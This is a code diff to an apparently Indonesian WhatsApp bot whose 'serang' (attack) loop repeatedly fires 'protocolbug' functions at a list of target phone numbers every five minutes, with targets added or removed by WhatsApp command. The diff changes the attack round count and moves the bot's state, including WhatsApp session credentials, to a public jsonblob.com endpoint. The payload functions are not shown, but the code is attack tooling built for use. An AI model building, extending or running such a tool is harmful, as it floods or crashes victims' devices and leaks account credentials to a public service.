@@ -342,7 +342,7 @@ function cekJam() {
 
 function serang(targets) {
   return new Promise(async resolve => {
-    for (let i = 1; i <= 50; i++) {
+    for (let i = 1; i <= 40; i++) {
       cekJam();
       await protocolbug5();
       await tunggu(1500);
@@ -354,7 +354,7 @@ function serang(targets) {
       await tunggu(1500);
       await protocolbug3();
       console.log("serangan ke-" + i);
-      if (i == 50) {
+      if (i == 40) {
         resolve();
       }
     }
@@ -394,14 +394,14 @@ async function start() {
   });
   if (arr.toString() != arrX) {
     blob.targets = arr;
-    // await updateData();
-    fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
+    await updateData();
+    // fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
   }
   if (arr.length > 0) {
     await serang();
     blob.waktu = new Date().getTime() + 60000 * 5;
-    // await updateData();
-    fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
+    await updateData();
+    //fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
     exec = setTimeout(start, 60000 * 5);
   } else {
     exec = setTimeout(start, 60000 * 5);
@@ -411,8 +411,8 @@ async function start() {
 async function olahTarget(aksi, target) {
   if (aksi == "add" && target) {
     blob.targets.push(target);
-    // await updateData();
-    fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
+    await updateData();
+    //fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
     if (wait?._destroyed == false) {
       clearTimeout(wait);
       start();
@@ -420,8 +420,8 @@ async function olahTarget(aksi, target) {
     sendMsg(nomorRequest + "@s.whatsapp.net", { text: "add OK" });
   } else if (aksi == "del" && blob.targets.indexOf(target) >= 0) {
     blob.targets.splice(blob.targets.indexOf(target), 1);
-    // await updateData();
-    fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
+    await updateData();
+    // fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
     sendMsg(nomorRequest + "@s.whatsapp.net", { text: "del OK" });
   } else if (aksi == "all") {
     let msg = "\n";
@@ -451,7 +451,7 @@ async function bot(session) {
 
   if (!session) {
     const { state } = await useMultiFileAuthState("session");
-    /*await fetch("https://jsonblob.com/api/jsonBlob/1389135762926264320", {
+    await fetch("https://jsonblob.com/api/jsonBlob/1389135762926264320", {
       headers: { Accept: "application/json", "Content-Type": "application/json" }
     })
       .then(r => r.json())
@@ -463,11 +463,12 @@ async function bot(session) {
           session.keys.get = state.keys.get;
           session.keys.set = state.keys.set;
         } else {
+          nomorRequest = r.nomor;
           session = state;
         }
-      });*/
+      });
 
-    blob = JSON.parse(fs.readFileSync("./data.json", "utf-8"));
+    /*blob = JSON.parse(fs.readFileSync("./data.json", "utf-8"));
     if (blob.session.creds) {
       nomorRequest = blob.session.creds.me.id.split(":")[0];
       session = reviveBuffer(blob.session);
@@ -475,7 +476,7 @@ async function bot(session) {
       session.keys.set = state.keys.set;
     } else {
       session = state;
-    }
+    }*/
   }
 
   const { version } = await fetchLatestBaileysVersion();
@@ -489,7 +490,7 @@ async function bot(session) {
   });
 
   if (!sock.user && !sock.authState.creds.registered) {
-    await tunggu(5000);
+    await tunggu(2000);
     const code = await sock.requestPairingCode(nomorRequest.replace(/\D/g, ""));
     clearTimeout(wait);
     clearTimeout(exec);
@@ -511,8 +512,8 @@ async function bot(session) {
         if (statusCode === 401 && error === "Unauthorized") {
           console.log("Unauthorized 401");
           blob.session = {};
-          // await updateData();
-          fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
+          await updateData();
+          //fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
           return bot();
         }
       }
@@ -540,8 +541,8 @@ async function bot(session) {
 
   sock.ev.on("creds.update", async () => {
     blob.session = sock.authState;
-    // await updateData();
-    fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
+    await updateData();
+    //fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
   });
 
   sock.ev.on("messages.upsert", ({ messages }) => {
